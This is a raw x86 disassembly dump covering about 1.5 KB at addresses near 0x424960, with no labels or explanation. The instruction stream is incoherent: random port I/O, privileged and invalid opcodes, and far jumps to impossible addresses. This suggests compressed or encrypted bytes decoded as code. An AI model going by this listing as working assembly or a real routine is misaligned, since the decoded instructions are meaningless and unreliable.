  424960:	30 af a9 9b 22 88    	xor    %ch,-0x77dd6457(%edi)
  424966:	9b                   	fwait
  424967:	74 14                	je     0x42497d
  424969:	61                   	popa
  42496a:	8d 4d 06             	lea    0x6(%ebp),%ecx
  42496d:	3a 7f 26             	cmp    0x26(%edi),%bh
  424970:	f8                   	clc
  424971:	12 71 ff             	adc    -0x1(%ecx),%dh
  424974:	ea eb 63 d8 dc c4 55 	ljmp   $0x55c4,$0xdcd863eb
  42497b:	b1 ce                	mov    $0xce,%cl
  42497d:	9d                   	popf
  42497e:	47                   	inc    %edi
  42497f:	8a c0                	mov    %al,%al
  424981:	76 39                	jbe    0x4249bc
  424983:	63 b2 4f 2b 3c a4    	arpl   %esi,-0x5bc3d4b1(%edx)
  424989:	28 1d 15 96 01 0f    	sub    %bl,0xf019615
  42498f:	ee                   	out    %al,(%dx)
  424990:	88 da                	mov    %bl,%dl
  424992:	01 c7                	add    %eax,%edi
  424994:	7a b3                	jp     0x424949
  424996:	f3 9f                	repz lahf
  424998:	6c                   	insb   (%dx),%es:(%edi)
  424999:	8c e5                	mov    %fs,%ebp
  42499b:	78 5e                	js     0x4249fb
  42499d:	65 d7                	xlat   %gs:(%ebx)
  42499f:	51                   	push   %ecx
  4249a0:	50                   	push   %eax
  4249a1:	3e c9                	ds leave
  4249a3:	2a 42 17             	sub    0x17(%edx),%al
  4249a6:	bb 03 34 f0 ad       	mov    $0xadf03403,%ebx
  4249ab:	dc 26                	fsubl  (%esi)
  4249ad:	c9                   	leave
  4249ae:	9f                   	lahf
  4249af:	b5 18                	mov    $0x18,%ch
  4249b1:	a2 91 8e 0a 7b       	mov    %al,0x7b0a8e91
  4249b6:	83 67 fc 53          	andl   $0x53,-0x4(%edi)
  4249ba:	75 40                	jne    0x4249fc
  4249bc:	ee                   	out    %al,(%dx)
  4249bd:	2c 67                	sub    $0x67,%al
  4249bf:	19 e0                	sbb    %esp,%eax
  4249c1:	05 59 f2 d2 de       	add    $0xded2f259,%eax
  4249c6:	4b                   	dec    %ebx
  4249c7:	cb                   	lret
  4249c8:	c4 b7 3d a4 b6 90    	les    -0x6f495bc3(%edi),%esi
  4249ce:	2f                   	das
  4249cf:	7d a8                	jge    0x424979
  4249d1:	69 21 56 9a 42 13    	imul   $0x13429a56,(%ecx),%esp
  4249d7:	2f                   	das
  4249d8:	8c 1b                	mov    %ds,(%ebx)
  4249da:	05 08 7e f4 f7       	add    $0xf7f47e08,%eax
  4249df:	e0 70                	loopne 0x424a51
  4249e1:	cd e9                	int    $0xe9
  4249e3:	b9 62 a6 db 92       	mov    $0x92dba662,%ecx
  4249e8:	54                   	push   %esp
  4249e9:	7f cd                	jg     0x4249b8
  4249eb:	6b 46 58 bf          	imul   $0xffffffbf,0x58(%esi),%eax
  4249ef:	44                   	inc    %esp
  4249f0:	38 31                	cmp    %dh,(%ecx)
  4249f2:	b1 1d                	mov    $0x1d,%cl
  4249f4:	2a 0a                	sub    (%edx),%cl
  4249f6:	a3 f6 1c e3 95       	mov    %eax,0x95e31cf6
  4249fb:	cf                   	iret
  4249fc:	0e                   	push   %cs
  4249fd:	bc 87 a8 00 95       	mov    $0x9500a887,%esp
  424a02:	79 81                	jns    0x424985
  424a04:	f2 6d                	repnz insl (%dx),%es:(%edi)
  424a06:	6b 5a e4 46          	imul   $0x46,-0x1c(%edx),%ebx
  424a0a:	5d                   	pop    %ebp
  424a0b:	33 d6                	xor    %esi,%edx
  424a0d:	1f                   	pop    %ds
  424a0e:	4f                   	dec    %edi
  424a0f:	0c c8                	or     $0xc8,%al
  424a11:	f8                   	clc
  424a12:	41                   	inc    %ecx
  424a13:	e5 ba                	in     $0xba,%eax
  424a15:	d1 33                	shll   $1,(%ebx)
  424a17:	be ac aa 25 97       	mov    $0x9725aaac,%esi
  424a1c:	9e                   	sahf
  424a1d:	83 17 70             	adcl   $0x70,(%edi)
  424a20:	90                   	nop
  424a21:	5c                   	pop    %esp
  424a22:	09 49 82             	or     %ecx,-0x7e(%ecx)
  424a25:	35 fb 21 74 0e       	xor    $0xe7421fb,%eax
  424a2a:	ed                   	in     (%dx),%eax
  424a2b:	fa                   	cli
  424a2c:	66 e7 df             	out    %ax,$0xdf
  424a2f:	d3 58 c0             	rcrl   %cl,-0x40(%eax)
  424a32:	d1 ac 4a 99 c3 85 3c 	shrl   $1,0x3c85c399(%edx,%ecx,2)
  424a39:	72 b5                	jb     0x4249f0
  424a3b:	5e                   	pop    %esi
  424a3c:	2e 4b                	cs dec %ebx
  424a3e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  424a3f:	37                   	aaa
  424a40:	20 24 99             	and    %ah,(%ecx,%ebx,4)
  424a43:	10 12                	adc    %dl,(%edx)
  424a45:	fd                   	std
  424a46:	8b e9                	mov    %ecx,%ebp
  424a48:	04 d6                	add    $0xd6,%al
  424a4a:	7d c2                	jge    0x424a0e
  424a4c:	f6 ae 6f 9b e8 87    	imulb  -0x78176491(%esi)
  424a52:	61                   	popa
  424a53:	74 da                	je     0x424a2f
  424a55:	60                   	pusha
  424a56:	53                   	push   %ebx
  424a57:	4d                   	dec    %ebp
  424a58:	cc                   	int3
  424a59:	39 45 26             	cmp    %eax,0x26(%ebp)
  424a5c:	be 12 37 ff b0       	mov    $0xb0ff3712,%esi
  424a61:	eb 29                	jmp    0x424a8c
  424a63:	d8 a2 c4 1b b1 94    	fsubs  -0x6b4ee43c(%edx)
  424a69:	9d                   	popf
  424a6a:	0d 8a 86 76 ff       	or     $0xff76868a,%eax
  424a6f:	62 78 4f             	bound  %edi,0x4f(%eax)
  424a72:	f1                   	int1
  424a73:	3b 6a 28             	cmp    0x28(%edx),%ebp
  424a76:	e3 14                	jecxz  0x424a8c
  424a78:	5c                   	pop    %esp
  424a79:	01 d5                	add    %edx,%ebp
  424a7b:	ed                   	in     (%dx),%eax
  424a7c:	4e                   	dec    %esi
  424a7d:	da c7                	fcmovb %st(7),%st
  424a7f:	c6 40 b3 b9          	movb   $0xb9,-0x4d(%eax)
  424a83:	9f                   	lahf
  424a84:	32 8c ab 78 24 65 9d 	xor    -0x629adb88(%ebx,%ebp,4),%cl
  424a8b:	51                   	push   %ecx
  424a8c:	16                   	push   %ss
  424a8d:	3e 8f 2a 08 17       	(bad)
  424a92:	81 03 fa ef 73 dc    	addl   $0xdc73effa,(%ebx)
  424a98:	ec                   	in     (%dx),%al
  424a99:	c8 65 b5 de          	enter  $0xb565,$0xde
  424a9d:	a1 57 8e d0 7a       	mov    0x7ad08e57,%eax
  424aa2:	49                   	dec    %ecx
  424aa3:	67 c2 53 3b          	addr16 ret $0x3b53
  424aa7:	40                   	inc    %eax
  424aa8:	b4 2c                	mov    $0x2c,%ah
  424aaa:	2d 19 a6 05 1f       	sub    $0x1f05a619,%eax
  424aaf:	f2 98                	repnz cwtl
  424ab1:	de 11                	ficoms (%ecx)
  424ab3:	cb                   	lret
  424ab4:	8a b7 03 a4 7c 90    	mov    -0x6f835bfd(%edi),%dh
  424aba:	f5                   	cmc
  424abb:	7c 6e                	jl     0x424b2b
  424abd:	69 e7 55 60 42 d9    	imul   $0xd9426055,%edi,%esp
  424ac3:	2e 52                	cs push %edx
  424ac5:	1b cb                	sbb    %ebx,%ecx
  424ac7:	07                   	pop    %es
  424ac8:	44                   	inc    %esp
  424ac9:	f4                   	hlt
  424aca:	bd e0 36 cd af       	mov    $0xafcd36e0,%ebp
  424acf:	b9 28 a6 a1 92       	mov    $0x92a1a628,%ecx
  424ad4:	1a 7f 93             	sbb    -0x6d(%edi),%bh
  424ad7:	6b 0c 58 85          	imul   $0xffffff85,(%eax,%ebx,2),%ecx
  424adb:	44                   	inc    %esp
  424adc:	fe                   	(bad)
  424add:	30 77 1d             	xor    %dh,0x1d(%edi)
  424ae0:	f0 09 69 f6          	lock or %ebp,-0xa(%ecx)
  424ae4:	e2 e2                	loop   0x424ac8
  424ae6:	5b                   	pop    %ebx
  424ae7:	cf                   	iret
  424ae8:	d4 bb                	aam    $0xbb
  424aea:	4d                   	dec    %ebp
  424aeb:	a8 c6                	test   $0xc6,%al
  424aed:	94                   	xchg   %eax,%esp
  424aee:	3f                   	aas
  424aef:	81 b8 6d 31 5a aa 46 	cmpl   $0x9c332346,-0x55a5ce93(%eax)
  424af6:	23 33 9c 
  424af9:	1f                   	pop    %ds
  424afa:	15 0c 8e f8 07       	adc    $0x7f88e0c,%eax
  424aff:	e5 80                	in     $0x80,%eax
  424b01:	d1 f9                	sar    $1,%ecx
  424b03:	bd 72 aa eb 96       	mov    $0x96ebaa72,%ebp
  424b08:	64 83 dd 6f          	fs sbb $0x6f,%ebp
  424b0c:	56                   	push   %esi
  424b0d:	5c                   	pop    %esp
  424b0e:	cf                   	iret
  424b0f:	48                   	dec    %eax
  424b10:	48                   	dec    %eax
  424b11:	35 c1 21 3a 0e       	xor    $0xe3a21c1,%eax
  424b16:	b3 fa                	mov    $0xfa,%bl
  424b18:	2c e7                	sub    $0xe7,%al
  424b1a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  424b1b:	d3 1e                	rcrl   %cl,(%esi)
  424b1d:	c0 97 ac 10 99 89 85 	rclb   $0x85,-0x7666ef54(%edi)
  424b24:	02 72 7b             	add    0x7b(%edx),%dh
  424b27:	5e                   	pop    %esi
  424b28:	f4                   	hlt
  424b29:	4a                   	dec    %edx
  424b2a:	6d                   	insl   (%dx),%es:(%edi)
  424b2b:	37                   	aaa
  424b2c:	e6 23                	out    %al,$0x23
  424b2e:	5f                   	pop    %edi
  424b2f:	10 d8                	adc    %bl,%al
  424b31:	fc                   	cld
  424b32:	51                   	push   %ecx
  424b33:	e9 ca d5 43 c2       	jmp    0xc2862102
  424b38:	bc ae 35 9b ae       	mov    $0xae9b35ae,%esp
  424b3d:	87 27                	xchg   %esp,(%edi)
  424b3f:	74 a0                	je     0x424ae1
  424b41:	60                   	pusha
  424b42:	19 4d 92             	sbb    %ecx,-0x6e(%ebp)
  424b45:	39 0b                	cmp    %ecx,(%ebx)
  424b47:	26 84 12             	test   %dl,%es:(%edx)
  424b4a:	fd                   	std
  424b4b:	fe                   	(bad)
  424b4c:	76 eb                	jbe    0x424b39
  424b4e:	ef                   	out    %eax,(%dx)
  424b4f:	d7                   	xlat   %ds:(%ebx)
  424b50:	68 c4 e1 b0 5a       	push   $0x5ab0e1c4
  424b55:	9d                   	popf
  424b56:	d3 89 4c 76 c5 62    	rorl   %cl,0x62c5764c(%ecx)
  424b5c:	3e 4f                	ds dec %edi
  424b5e:	b7 3b                	mov    $0x3b,%bh
  424b60:	30 28                	xor    %ch,(%eax)
  424b62:	a9 14 22 01 9b       	test   $0x9b012214,%eax
  424b67:	ed                   	in     (%dx),%eax
  424b68:	14 da                	adc    $0xda,%al
  424b6a:	8d                   	lea    (bad),%eax
  424b6b:	c6 06 b3             	movb   $0xb3,(%esi)
  424b6e:	7f 9f                	jg     0x424b0f
  424b70:	f8                   	clc
  424b71:	8b 71 78             	mov    0x78(%ecx),%esi
  424b74:	ea 64 63 51 dc 3d 55 	ljmp   $0x553d,$0xdc516364
  424b7b:	2a ce                	sub    %dh,%cl
  424b7d:	16                   	push   %ss
  424b7e:	47                   	inc    %edi
  424b7f:	03 c0                	add    %eax,%eax
  424b81:	ef                   	out    %eax,(%dx)
  424b82:	39 dc                	cmp    %ebx,%esp
  424b84:	b2 c8                	mov    $0xc8,%dl
  424b86:	2b b5 a4 a1 1d 8e    	sub    -0x71e25e5c(%ebp),%esi
  424b8c:	96                   	xchg   %eax,%esi
  424b8d:	7a 0f                	jp     0x424b9e
  424b8f:	67 88 53 01          	mov    %dl,0x1(%bp,%di)
  424b93:	40                   	inc    %eax
  424b94:	7a 2c                	jp     0x424bc2
  424b96:	f3 18 6c 05 e5       	repz sbb %ch,-0x1b(%ebp,%eax,1)
  424b9b:	f1                   	int1
  424b9c:	5e                   	pop    %esi
  424b9d:	de d7                	(bad)
  424b9f:	ca 50 b7             	lret   $0xb750
  424ba2:	c9                   	leave
  424ba3:	a3 42 90 bb 7c       	mov    %eax,0x7cbb9042
  424ba8:	34 69                	xor    $0x69,%al
  424baa:	ad                   	lods   %ds:(%esi),%eax
  424bab:	55                   	push   %ebp
  424bac:	26 42                	es inc %edx
  424bae:	9f                   	lahf
  424baf:	2e 18 1b             	sbb    %bl,%cs:(%ebx)
  424bb2:	91                   	xchg   %eax,%ecx
  424bb3:	07                   	pop    %es
  424bb4:	0a f4                	or     %ah,%dh
  424bb6:	83 e0 fc             	and    $0xfffffffc,%eax
  424bb9:	cc                   	int3
  424bba:	75 b9                	jne    0x424b75
  424bbc:	ee                   	out    %al,(%dx)
  424bbd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  424bbe:	67 92                	addr16 xchg %eax,%edx
  424bc0:	e0 7e                	loopne 0x424c40
  424bc2:	59                   	pop    %ecx
  424bc3:	6b d2 57             	imul   $0x57,%edx,%edx
  424bc6:	4b                   	dec    %ebx
  424bc7:	44                   	inc    %esp
  424bc8:	c4 30                	les    (%eax),%esi
  424bca:	3d 1d b6 09 2f       	cmp    $0x2f09b61d,%eax
  424bcf:	f6 a8 e2 21 cf 9a    	imulb  -0x6530de1e(%eax)
  424bd5:	bb 13 a8 8c 94       	mov    $0x948ca813,%ebx
  424bda:	05 81 7e 6d f7       	add    $0xf76d7e81,%eax
  424bdf:	59                   	pop    %ecx
  424be0:	70 46                	jo     0x424c28
  424be2:	e9 32 62 1f db       	jmp    0xdb61ae19
  424be7:	0b 54 f8 cd          	or     -0x33(%eax,%edi,8),%edx
  424beb:	e4 46                	in     $0x46,%al
  424bed:	d1 bf bd 38 aa b1    	sarl   $1,-0x4e55c743(%edi)
  424bf3:	96                   	xchg   %eax,%esi
  424bf4:	2a 83 a3 6f 1c 5c    	sub    0x5c1c6fa3(%ebx),%al
  424bfa:	95                   	xchg   %eax,%ebp
  424bfb:	48                   	dec    %eax
  424bfc:	0e                   	push   %cs
  424bfd:	35 87 21 00 0e       	xor    $0xe002187,%eax
  424c02:	79 fa                	jns    0x424bfe
  424c04:	f2 e6 6b             	repnz out %al,$0x6b
  424c07:	d3 e4                	shl    %cl,%esp
  424c09:	bf 5d ac d6 98       	mov    $0x98d6ac5d,%edi
  424c0e:	4f                   	dec    %edi
  424c0f:	85 c8                	test   %ecx,%eax
  424c11:	71 41                	jno    0x424c54
  424c13:	5e                   	pop    %esi
  424c14:	ba 4a 33 37 ac       	mov    $0xac37334a,%edx
  424c19:	23 25 10 9e fc 17    	and    0x17fc9e10,%esp
  424c1f:	e9 90 d5 09 c2       	jmp    0xc24c21b4
  424c24:	82 ae fb 9a 74 87 ed 	subb   $0xed,-0x788b6505(%esi)
  424c2b:	73 66                	jae    0x424c93
  424c2d:	60                   	pusha
  424c2e:	df 4c 58 39          	fisttps 0x39(%eax,%ebx,2)
  424c32:	d1 25 4a 12 c3 fe    	shll   $1,0xfec3124a
  424c38:	3c eb                	cmp    $0xeb,%al
  424c3a:	b5 d7                	mov    $0xd7,%ch
  424c3c:	2e c4 a7 b0 20 9d 99 	les    %cs:-0x6662df50(%edi),%esp
  424c43:	89 12                	mov    %edx,(%edx)
  424c45:	76 8b                	jbe    0x424bd2
  424c47:	62 04 4f             	bound  %eax,(%edi,%ecx,2)
  424c4a:	7d 3b                	jge    0x424c87
  424c4c:	f6 27                	mulb   (%edi)
  424c4e:	6f                   	outsl  %ds:(%esi),(%dx)
  424c4f:	14 e8                	adc    $0xe8,%al
  424c51:	00 61 ed             	add    %ah,-0x13(%ecx)
  424c54:	da d9                	fcmovu %st(1),%st
  424c56:	53                   	push   %ebx
  424c57:	c6                   	(bad)
  424c58:	cc                   	int3
  424c59:	b2 45                	mov    $0x45,%dl
  424c5b:	9f                   	lahf
  424c5c:	be 8b 37 78 b0       	mov    $0xb078378b,%esi
  424c61:	64 29 51 a2          	sub    %edx,%fs:-0x5e(%ecx)
  424c65:	3d 1b 2a 94 16       	cmp    $0x16942a1b,%eax
  424c6a:	0d 03 86 ef ff       	or     $0xffef8603,%eax
  424c6f:	db 78 c8             	fstpt  -0x38(%eax)
  424c72:	f1                   	int1
  424c73:	b4 6a                	mov    $0x6a,%ah
  424c75:	a1 e3 8d 5c 7a       	mov    0x7a5c8de3,%eax
  424c7a:	d5 66                	aad    $0x66
  424c7c:	4e                   	dec    %esi
  424c7d:	53                   	push   %ebx
  424c7e:	c7                   	(bad)
  424c7f:	3f                   	aas
  424c80:	40                   	inc    %eax
  424c81:	2c b9                	sub    $0xb9,%al
  424c83:	18 32                	sbb    %dh,(%edx)
  424c85:	05 ab f1 24 de       	add    $0xde24f1ab,%eax
  424c8a:	9d                   	popf
  424c8b:	ca 16 b7             	lret   $0xb716
  424c8e:	8f                   	(bad)
  424c8f:	a3 08 90 81 7c       	mov    %eax,0x7c819008
  424c94:	fa                   	cli
  424c95:	68 73 55 ec 41       	push   $0x41ec5573
  424c9a:	65 2e de 1a          	gs ficomps %cs:(%edx)
  424c9e:	57                   	push   %edi
  424c9f:	07                   	pop    %es
  424ca0:	d0 f3                	shl    $1,%bl
  424ca2:	49                   	dec    %ecx
  424ca3:	e0 c2                	loopne 0x424c67
  424ca5:	cc                   	int3
  424ca6:	3b b9 b4 a5 2d 92    	cmp    -0x6dd25a4c(%ecx),%edi
  424cac:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  424cad:	7e 1f                	jle    0x424cce
  424caf:	6b 98 57 11 44 8a 30 	imul   $0x30,-0x75bbeea9(%eax),%ebx
  424cb6:	03 1d 7c 09 f5 f5    	add    0xf5f5097c,%ebx
  424cbc:	6e                   	outsb  %ds:(%esi),(%dx)
  424cbd:	e2 e7                	loop   0x424ca6
  424cbf:	ce                   	into
  424cc0:	60                   	pusha
  424cc1:	bb d9 a7 52 94       	mov    $0x9452a7d9,%ebx
  424cc6:	cb                   	lret
  424cc7:	80 44 6d bd 59       	addb   $0x59,-0x43(%ebp,%ebp,2)
  424ccc:	36 46                	ss inc %esi
  424cce:	af                   	scas   %es:(%edi),%eax
  424ccf:	32 28                	xor    (%eax),%ch
  424cd1:	1f                   	pop    %ds
  424cd2:	a1 0b 1a f8 93       	mov    0x93f81a0b,%eax
  424cd7:	e4 0c                	in     $0xc,%al
  424cd9:	d1 85 bd fe a9 77    	roll   $1,0x77a9febd(%ebp)
  424cdf:	96                   	xchg   %eax,%esi
  424ce0:	f0 82 69 6f e2       	lock subb $0xe2,0x6f(%ecx)
  424ce5:	5b                   	pop    %ebx
  424ce6:	5b                   	pop    %ebx
  424ce7:	48                   	dec    %eax
  424ce8:	d4 34                	aam    $0x34
  424cea:	4d                   	dec    %ebp
  424ceb:	21 c6                	and    %eax,%esi
  424ced:	0d 3f fa b8 e6       	or     $0xe6b8fa3f,%eax
  424cf2:	31 d3                	xor    %edx,%ebx
  424cf4:	aa                   	stos   %al,%es:(%edi)
  424cf5:	bf 23 ac 9c 98       	mov    $0x989cac23,%edi
  424cfa:	15 85 8e 71 07       	adc    $0x7718e85,%eax
  424cff:	5e                   	pop    %esi
  424d00:	80 4a f9 36          	orb    $0x36,-0x7(%edx)
  424d04:	72 23                	jb     0x424d29
  424d06:	eb 0f                	jmp    0x424d17
  424d08:	64 fc                	fs cld
  424d0a:	dd e8                	fucomp %st(0)
  424d0c:	56                   	push   %esi
  424d0d:	d5 cf                	aad    $0xcf
  424d0f:	c1 48 ae c1          	rorl   $0xc1,-0x52(%eax)
  424d13:	9a 3a 87 b3 73 2c 60 	lcall  $0x602c,$0x73b3873a
  424d1a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  424d1b:	4c                   	dec    %esp
  424d1c:	1e                   	push   %ds
  424d1d:	39 97 25 10 12 89    	cmp    %edx,-0x76edefdb(%edi)
  424d23:	fe 02                	incb   (%edx)
  424d25:	eb 7b                	jmp    0x424da2
  424d27:	d7                   	xlat   %ds:(%ebx)
  424d28:	f4                   	hlt
  424d29:	c3                   	ret
  424d2a:	6d                   	insl   (%dx),%es:(%edi)
  424d2b:	b0 e6                	mov    $0xe6,%al
  424d2d:	9c                   	pushf
  424d2e:	5f                   	pop    %edi
  424d2f:	89 d8                	mov    %ebx,%eax
  424d31:	75 51                	jne    0x424d84
  424d33:	62 ca 4e             	(bad) {%k3}
  424d36:	43                   	inc    %ebx
  424d37:	3b bc 27 35 14 ae 00 	cmp    0xae1435(%edi,%eiz,1),%edi
  424d3e:	27                   	daa
  424d3f:	ed                   	in     (%dx),%eax
  424d40:	a0 d9 19 c6 92       	mov    0x92c619d9,%al
  424d45:	b2 0b                	mov    $0xb,%dl
  424d47:	9f                   	lahf
  424d48:	84 8b fd 77 76 64    	test   %cl,0x647677fd(%ebx)
  424d4e:	ef                   	out    %eax,(%dx)
  424d4f:	50                   	push   %eax
  424d50:	68 3d e1 29 5a       	push   $0x5a29e13d
  424d55:	16                   	push   %ss
  424d56:	d3 02                	roll   %cl,(%edx)
  424d58:	4c                   	dec    %esp
  424d59:	ef                   	out    %eax,(%dx)
  424d5a:	c5 db 3e             	(bad)
  424d5d:	c8 b7 b4 30          	enter  $0xb4b7,$0x30
  424d61:	a1 a9 8d 22 7a       	mov    0x7a228da9,%eax
  424d66:	9b                   	fwait
  424d67:	66 14 53             	data16 adc $0x53,%al
  424d6a:	8d 3f                	lea    (%edi),%edi
  424d6c:	06                   	push   %es
  424d6d:	2c 7f                	sub    $0x7f,%al
  424d6f:	18 f8                	sbb    %bh,%al
  424d71:	04 71                	add    $0x71,%al
  424d73:	f1                   	int1
  424d74:	ea dd 63 ca dc b6 55 	ljmp   $0x55b6,$0xdcca63dd
  424d7b:	a3 ce 8f 47 7c       	mov    %eax,0x7c478fce
  424d80:	c0 68 39 55          	shrb   $0x55,0x39(%eax)
  424d84:	b2 41                	mov    $0x41,%dl
  424d86:	2b 2e                	sub    (%esi),%ebp
  424d88:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  424d89:	1a 1d 07 96 f3 0f    	sbb    0xff39607,%bl
  424d8f:	e0 88                	loopne 0x424d19
  424d91:	cc                   	int3
  424d92:	01 b9 7a a5 f3 91    	add    %edi,-0x6e0c5a86(%ecx)
  424d98:	6c                   	insb   (%dx),%es:(%edi)
  424d99:	7e e5                	jle    0x424d80
  424d9b:	6a 5e                	push   $0x5e
  424d9d:	57                   	push   %edi
  424d9e:	d7                   	xlat   %ds:(%ebx)
  424d9f:	43                   	inc    %ebx
  424da0:	50                   	push   %eax
  424da1:	30 c9                	xor    %cl,%cl
  424da3:	1c 42                	sbb    $0x42,%al
  424da5:	09 bb f5 34 e2 ad    	or     %edi,-0x521dcb0b(%ebx)
  424dab:	ce                   	into
  424dac:	26 bb 9f a7 18 94    	es mov $0x9418a79f,%ebx
  424db2:	91                   	xchg   %eax,%ecx
  424db3:	80 0a 6d             	orb    $0x6d,(%edx)
  424db6:	83 59 fc 45          	sbbl   $0x45,-0x4(%ecx)
  424dba:	75 32                	jne    0x424dee
  424dbc:	ee                   	out    %al,(%dx)
  424dbd:	1e                   	push   %ds
  424dbe:	67 0b e0             	addr16 or %eax,%esp
  424dc1:	f7 59 e4             	negl   -0x1c(%ecx)
  424dc4:	d2 d0                	rcl    %cl,%al
  424dc6:	4b                   	dec    %ebx
  424dc7:	bd c4 a9 3d 96       	mov    $0x963da9c4,%ebp
  424dcc:	b6 82                	mov    $0x82,%dh
  424dce:	2f                   	das
  424dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  424dd0:	a8 5b                	test   $0x5b,%al
  424dd2:	21 48 9a             	and    %ecx,-0x66(%eax)
  424dd5:	34 13                	xor    $0x13,%al
  424dd7:	21 8c 0d 05 fa 7e e6 	and    %ecx,-0x198105fb(%ebp,%ecx,1)
  424dde:	f7 d2                	not    %edx
  424de0:	70 bf                	jo     0x424da1
  424de2:	e9 ab 62 98 db       	jmp    0xdbdab092
  424de7:	84 54 71 cd          	test   %dl,-0x33(%ecx,%esi,2)
  424deb:	5d                   	pop    %ebp
  424dec:	46                   	inc    %esi
  424ded:	4a                   	dec    %edx
  424dee:	bf 36 38 23 b1       	mov    $0xb1233836,%edi
  424df3:	0f 2a fc             	cvtpi2ps %mm4,%xmm7
  424df6:	a3 e8 1c d5 95       	mov    %eax,0x95d51ce8
  424dfb:	c1 0e ae             	rorl   $0xae,(%esi)
  424dfe:	87 9a 00 87 79 73    	xchg   %ebx,0x73798700(%edx)
  424e04:	f2 5f                	repnz pop %edi
  424e06:	6b 4c e4 38 5d       	imul   $0x5d,0x38(%esp,%eiz,8),%ecx
  424e0b:	25 d6 11 4f fe       	and    $0xfe4f11d6,%eax
  424e10:	c8 ea 41 d7          	enter  $0x41ea,$0xd7
  424e14:	ba c3 33 b0 ac       	mov    $0xacb033c3,%edx
  424e19:	9c                   	pushf
  424e1a:	25 89 9e 75 17       	and    $0x17759e89,%eax
  424e1f:	62 90 4e 09 3b 82    	bound  %edx,-0x7dc4f6b2(%eax)
  424e25:	27                   	daa
  424e26:	fb                   	sti
  424e27:	13 74 00 ed          	adc    -0x13(%eax,%eax,1),%esi
  424e2b:	ec                   	in     (%dx),%al
  424e2c:	66 d9 df             	data16 (bad)
  424e2f:	c5 58 b2             	lds    -0x4e(%eax),%ebx
  424e32:	d1 9e 4a 8b c3 77    	rcrl   $1,0x77c38b4a(%esi)
  424e38:	3c 64                	cmp    $0x64,%al
  424e3a:	b5 50                	mov    $0x50,%ch
  424e3c:	2e 3d a7 29 20 16    	cs cmp $0x162029a7,%eax
  424e42:	99                   	cltd
  424e43:	02 12                	add    (%edx),%dl
  424e45:	ef                   	out    %eax,(%dx)
  424e46:	8b db                	mov    %ebx,%ebx
  424e48:	04 c8                	add    $0xc8,%al
  424e4a:	7d b4                	jge    0x424e00
  424e4c:	f6 a0 6f 8d e8 79    	mulb   0x79e88d6f(%eax)
  424e52:	61                   	popa
  424e53:	66 da 52 53          	data16 ficoml 0x53(%edx)
  424e57:	3f                   	aas
  424e58:	cc                   	int3
  424e59:	2b 45 18             	sub    0x18(%ebp),%eax
  424e5c:	be 04 37 f1 b0       	mov    $0xb0f13704,%esi
  424e61:	dd 29                	(bad) (%ecx)
  424e63:	ca a2 b6             	lret   $0xb6a2
  424e66:	1b a3 94 8f 0d 7c    	sbb    0x7c0d8f94(%ebx),%esp
  424e6c:	86 68 ff             	xchg   %ch,-0x1(%eax)
  424e6f:	54                   	push   %esp
  424e70:	78 41                	js     0x424eb3
  424e72:	f1                   	int1
  424e73:	2d 6a 1a e3 06       	sub    $0x6e31a6a,%eax
  424e78:	5c                   	pop    %esp
  424e79:	f3 d5 df             	repz aad $0xdf
  424e7c:	4e                   	dec    %esi
  424e7d:	cc                   	int3
  424e7e:	c7 b8 40 a5 b9       	xbegin 0xb9e78f3b,(bad)
  424e83:	91                   	xchg   %eax,%ecx
  424e84:	32 7e ab             	xor    -0x55(%esi),%bh
  424e87:	6a 24                	push   $0x24
  424e89:	57                   	push   %edi
  424e8a:	9d                   	popf
  424e8b:	43                   	inc    %ebx
  424e8c:	16                   	push   %ss
  424e8d:	30 8f 1c 08 09 81    	xor    %cl,-0x7ef6f7e4(%edi)
  424e93:	f5                   	cmc
  424e94:	fa                   	cli
  424e95:	e1 73                	loope  0x424f0a
  424e97:	ce                   	into
  424e98:	ec                   	in     (%dx),%al
  424e99:	ba 65 a7 de 93       	mov    $0x93dea765,%edx
  424e9e:	57                   	push   %edi
  424e9f:	80 d0 6c             	adc    $0x6c,%al
  424ea2:	49                   	dec    %ecx
  424ea3:	59                   	pop    %ecx
  424ea4:	c2 45 3b             	ret    $0x3b45
  424ea7:	32 b4 1e 2d 0b a6 f7 	xor    -0x859f4d3(%esi,%ebx,1),%dh
  424eae:	1f                   	pop    %ds
  424eaf:	e4 98                	in     $0x98,%al
  424eb1:	d0 11                	rclb   $1,(%ecx)
  424eb3:	bd 8a a9 03 96       	mov    $0x9603a98a,%ebp
  424eb8:	7c 82                	jl     0x424e3c
  424eba:	f5                   	cmc
  424ebb:	6e                   	outsb  %ds:(%esi),(%dx)
  424ebc:	6e                   	outsb  %ds:(%esi),(%dx)
  424ebd:	5b                   	pop    %ebx
  424ebe:	e7 47                	out    %eax,$0x47
  424ec0:	60                   	pusha
  424ec1:	34 d9                	xor    $0xd9,%al
  424ec3:	20 52 0d             	and    %dl,0xd(%edx)
  424ec6:	cb                   	lret
  424ec7:	f9                   	stc
  424ec8:	44                   	inc    %esp
  424ec9:	e6 bd                	out    %al,$0xbd
  424ecb:	d2 36                	shlb   %cl,(%esi)
  424ecd:	bf af ab 28 98       	mov    $0x9828abaf,%edi
  424ed2:	a1 84 1a 71 93       	mov    0x93711a84,%eax
  424ed7:	5d                   	pop    %ebp
  424ed8:	0c 4a                	or     $0x4a,%al
  424eda:	85 36                	test   %esi,(%esi)
  424edc:	fe                   	(bad)
  424edd:	22 77 0f             	and    0xf(%edi),%dh
  424ee0:	f0 fb                	lock sti
  424ee2:	69 e8 e2 d4 5b c1    	imul   $0xc15bd4e2,%eax,%ebp
  424ee8:	d4 ad                	aam    $0xad
  424eea:	4d                   	dec    %ebp
  424eeb:	9a c6 86 3f 73 b8 5f 	lcall  $0x5fb8,$0x733f86c6
  424ef2:	31 4c aa 38          	xor    %ecx,0x38(%edx,%ebp,4)
  424ef6:	23 25 9c 11 15 fe    	and    0xfe15119c,%esp
  424efc:	8e ea                	mov    %edx,%gs
  424efe:	07                   	pop    %es
  424eff:	d7                   	xlat   %ds:(%ebx)
  424f00:	80 c3 f9             	add    $0xf9,%bl
  424f03:	af                   	scas   %es:(%edi),%eax
  424f04:	72 9c                	jb     0x424ea2
  424f06:	eb 88                	jmp    0x424e90
  424f08:	64 75 dd             	fs jne 0x424ee8
  424f0b:	61                   	popa
  424f0c:	56                   	push   %esi
